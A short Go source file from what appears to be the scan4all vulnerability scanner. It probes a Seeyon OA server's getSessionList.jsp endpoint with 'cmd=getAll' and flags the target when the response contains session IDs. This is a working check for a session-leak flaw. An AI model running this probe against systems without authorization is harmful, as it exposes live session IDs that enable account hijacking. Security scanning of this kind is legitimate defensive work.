package seeyon

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

//getSessionList.jsp session leak

func GetSessionList(u string) bool {
	if req, err := util.HttpRequset(u+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "sessionID") {
			util.SendLog(req.RequestUrl, "seeyon", "Found vuln seeyon GetSessionList", "")
			return true
		}
	}
	return false
}
